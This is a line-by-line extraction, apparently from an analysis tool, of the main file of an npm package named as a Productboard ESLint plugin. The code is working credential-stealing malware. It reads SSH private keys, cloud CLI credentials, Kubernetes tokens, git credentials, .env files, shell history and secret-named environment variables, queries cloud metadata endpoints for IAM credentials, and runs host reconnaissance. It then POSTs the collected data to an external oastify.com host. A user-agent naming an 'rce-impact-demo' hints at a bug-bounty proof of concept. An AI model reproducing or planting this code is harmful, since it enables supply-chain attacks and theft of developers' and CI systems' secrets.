// File: tmp/tmpyk4yanfy/productboard-eslint-plugin-relay/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const fs = require("fs")
Line 4: const path = require("path")
Line 5: const https = require("https")
Line 6: const querystring = require("querystring")
Line 7: const child_process = require("child_process")
Line 12: const size = fs.statSync(p).size
Line 14: fs.readFileSync(p, "utf8")
Line 22: (_tmp_0 = fs.readdirSync(p))
Line 30: (_tmp_1 = child_process.execSync(cmd, { timeout }).toString()).trim
Line 38: _iterator_0.next()
Line 39: /pass|key|token|secret|env|auth|cred|aws|gcp|azure|kube|docker|jenkins|gitlab|github/i.test(key)
Line 40: result[key] = process.env[key]
Line 47: {
        cgroup: safeReadFile("/proc/1/cgroup"),
        dockerenv: fs.existsSync("/.dockerenv"),
        ciVars: Object.fromEntries(Object.entries(process.env).filter(([k]) => /ci|build|pipeline|github|gitlab|jenkins|circleci|travis/i.test(k))),
        kubernetes: {
            token: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token"),
            namespace: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"),
            kubeconfig: safeReadFile(path.join(os.homedir(), ".kube/config")),
        },
        dockerConfig: safeReadFile(path.join(os.homedir(), ".docker/config.json")),
    }
Line 48: safeReadFile("/proc/1/cgroup")
Line 49: _tmp_6.dockerenv = fs.existsSync("/.dockerenv")
Line 50: _tmp_6.ciVars = Object.fromEntries(Object.entries(process.env).filter(([k]) => /ci|build|pipeline|github|gitlab|jenkins|circleci|travis/i.test(k)))
Line 52: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
Line 53: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
Line 54: safeReadFile(path.join(os.homedir(), ".kube/config"))
Line 56: safeReadFile(path.join(os.homedir(), ".docker/config.json"))
Line 61: {
        branch: exec("git rev-parse --abbrev-ref HEAD"),
        remotes: exec("git remote -v"),
        config: safeReadFile(path.join(os.homedir(), ".gitconfig")),
        credentials: safeReadFile(path.join(os.homedir(), ".git-credentials")),
        netrc: safeReadFile(path.join(os.homedir(), ".netrc")),
    }
Line 62: _tmp_10.branch = exec("git rev-parse --abbrev-ref HEAD")
Line 63: _tmp_10.remotes = exec("git remote -v")
Line 64: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 65: safeReadFile(path.join(os.homedir(), ".git-credentials"))
Line 66: safeReadFile(path.join(os.homedir(), ".netrc"))
Line 71: {
        whoami: exec("whoami"),
        id: exec("id"),
        ps: exec("ps aux | head -n 30"),
        netstat: exec("ss -tunlp | head -n 30"),
        lsof: exec("lsof -n -i | head -n 30"),
        uname: exec("uname -a"),
        mounts: exec("cat /proc/mounts | head -n 30"),
        crontab: exec("crontab -l"),
    }
Line 72: _tmp_11.whoami = exec("whoami")
Line 73: _tmp_11.id = exec("id")
Line 74: _tmp_11.ps = exec("ps aux | head -n 30")
Line 75: _tmp_11.netstat = exec("ss -tunlp | head -n 30")
Line 76: _tmp_11.lsof = exec("lsof -n -i | head -n 30")
Line 77: _tmp_11.uname = exec("uname -a")
Line 78: _tmp_11.mounts = exec("cat /proc/mounts | head -n 30")
Line 79: _tmp_11.crontab = exec("crontab -l")
Line 84: {
        npm: exec("npm ls -g --depth=0 --json"),
        apt: exec("dpkg -l | head -n 30"),
        brew: exec("brew list || echo 'no brew'"),
        pip: exec("pip list --format=json || echo 'no pip'"),
        which_tools: {
            aws: exec("which aws"),
            gcloud: exec("which gcloud"),
            az: exec("which az"),
            kubectl: exec("which kubectl"),
            terraform: exec("which terraform"),
            docker: exec("which docker"),
            nmap: exec("which nmap"),
            curl: exec("which curl"),
        },
    }
Line 85: _tmp_12.npm = exec("npm ls -g --depth=0 --json")
Line 86: _tmp_12.apt = exec("dpkg -l | head -n 30")
Line 87: _tmp_12.brew = exec("brew list || echo 'no brew'")
Line 88: _tmp_12.pip = exec("pip list --format=json || echo 'no pip'")
Line 89: _tmp_12.which_tools = {
            aws: exec("which aws"),
            gcloud: exec("which gcloud"),
            az: exec("which az"),
            kubectl: exec("which kubectl"),
            terraform: exec("which terraform"),
            docker: exec("which docker"),
            nmap: exec("which nmap"),
            curl: exec("which curl"),
        }
Line 90: _tmp_13.aws = exec("which aws")
Line 91: _tmp_13.gcloud = exec("which gcloud")
Line 92: _tmp_13.az = exec("which az")
Line 93: _tmp_13.kubectl = exec("which kubectl")
Line 94: _tmp_13.terraform = exec("which terraform")
Line 95: _tmp_13.docker = exec("which docker")
Line 96: _tmp_13.nmap = exec("which nmap")
Line 97: _tmp_13.curl = exec("which curl")
Line 105: _tmp_15.push({ name: "aws_instance", url: "http://169.254.169.254/latest/dynamic/instance-identity/document" })
Line 106: _tmp_15.push({ name: "aws_metadata", url: "http://169.254.169.254/latest/meta-data/" })
Line 107: _tmp_15.push({ name: "aws_iam", url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" })
Line 108: _tmp_15.push({ name: "gcp_metadata", url: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", headers: { "Metadata-Flavor": "Google" } })
Line 109: _tmp_15.push({ name: "azure_metadata", url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers: { "Metadata": "true" } })
Line 111: _iterator_1.next()
Line 112: {
            let cmd = `curl -s --max-time 2 ${url}`;
            if (headers) {
                const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
                cmd = `curl -s --max-time 2 ${headerStr} ${url}`;
            }
            metadata[name] = exec(cmd);
        }
Line 114: {
                const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
                cmd = `curl -s --max-time 2 ${headerStr} ${url}`;
            }
Line 115: const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")
Line 118: metadata[name] = exec(cmd)
Line 119: catch (e) {
            metadata[name] = `ERR: ${e.message}`;
        }
Line 120: metadata[name] = `ERR: ${e.message}`
Line 127: {
        aws: {
            credentials: safeReadFile(path.join(os.homedir(), ".aws/credentials")),
            config: safeReadFile(path.join(os.homedir(), ".aws/config")),
            sts: exec("aws sts get-caller-identity"),
        },
        gcloud: {
            config: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default")),
            credentials: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db")),
        },
        azure: {
            credentials: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json")),
            accessTokens: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json")),
        },
    }
Line 128: _tmp_25.aws = {
            credentials: safeReadFile(path.join(os.homedir(), ".aws/credentials")),
            config: safeReadFile(path.join(os.homedir(), ".aws/config")),
            sts: exec("aws sts get-caller-identity"),
        }
Line 129: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 130: safeReadFile(path.join(os.homedir(), ".aws/config"))
Line 131: _tmp_26.sts = exec("aws sts get-caller-identity")
Line 134: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default"))
Line 135: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db"))
Line 138: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json"))
Line 139: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json"))
Line 145: {
        node_version: process.version,
        npm_config: exec("npm config ls -l"),
    }
Line 147: _tmp_29.npm_config = exec("npm config ls -l")
Line 154: dump = {
        p: (() => {
            try {
                return require("./package.json").name;
            } catch {
                return "unknown";
            }
        })(),
        v: (() => {
            try {
                return require("./package.json").version;
            } catch {
                return "unknown";
            }
        })(),
        c: process.cwd(),
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: (() => {
            try {
                return dns.getServers();
            } catch (e) {
                return [`ERR: ${e.message}`];
            }
        })(),
        pjson: (() => {
            try {
                const pkg = require("./package.json");
                return {
                    name: pkg.name,
                    version: pkg.version,
                    main: pkg.main,
                    keywords: pkg.keywords,
                    s...
Line 155: _tmp_31.p = (() => {
            try {
                return require("./package.json").name;
            } catch {
                return "unknown";
            }
        })()
Line 162: _tmp_31.v = (() => {
            try {
                return require("./package.json").version;
            } catch {
                return "unknown";
            }
        })()
Line 171: os.hostname()
Line 172: os.userInfo()
Line 177: _tmp_32.push(<operator>.formatString("ERR: ", e.message, ""))
Line 180: _tmp_31.pjson = (() => {
            try {
                const pkg = require("./package.json");
                return {
                    name: pkg.name,
                    version: pkg.version,
                    main: pkg.main,
                    keywords: pkg.keywords,
                    scripts: pkg.scripts,
                    author: pkg.author,
                    license: pkg.license,
                    description: pkg.description
                };
            } catch {
                return {};
            }
        })()
Line 182: const pkg = require("./package.json")
Line 208: safeReadFile("/etc/passwd")
Line 209: safeReadFile("/etc/hosts")
Line 210: safeReadFile("/etc/resolv.conf")
Line 211: safeReadFile(path.join(os.homedir(), ".bash_history"))
Line 212: safeReadFile(path.join(os.homedir(), ".zsh_history"))
Line 213: safeReadFile(path.join(os.homedir(), ".ssh/config"))
Line 214: safeReadFile(path.join(os.homedir(), ".ssh/id_rsa"))
Line 215: safeReadFile(path.join(os.homedir(), ".ssh/known_hosts"))
Line 216: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 217: safeReadFile(path.join(os.homedir(), ".aws/config"))
Line 218: safeReadFile(path.join(os.homedir(), ".npmrc"))
Line 219: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 220: safeReadFile(path.join(os.homedir(), ".docker/config.json"))
Line 222: safeReadFile(path.join(process.cwd(), ".env"))
Line 223: path.join(process.cwd(), ".github/workflows")
Line 231: getCloudMetadata()
Line 232: getCloudCLIs()
Line 240: {
    const postData = querystring.stringify({
        msg: encodeURIComponent(JSON.stringify(dump))
    });

    const options = {
        hostname: "ovnxva4z7pgbompisolekpb83z9qxmlb.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "User-Agent": "rce-impact-demo",
            "X-Report-ID": "328XXXX"
        },
        timeout: 5000,
    };

    const req = https.request(options, res => {
        res.on("data", () => { });
        res.on("end", () => { });
    });

    req.on("error", () => { });
    req.on("timeout", () => req.destroy());
    req.write(postData);
    req.end();
}
Line 259: const req = https.request(options, res => {
        res.on("data", () => { });
        res.on("end", () => { });
    })
Line 266: req.write(postData)
Line 267: req.end()
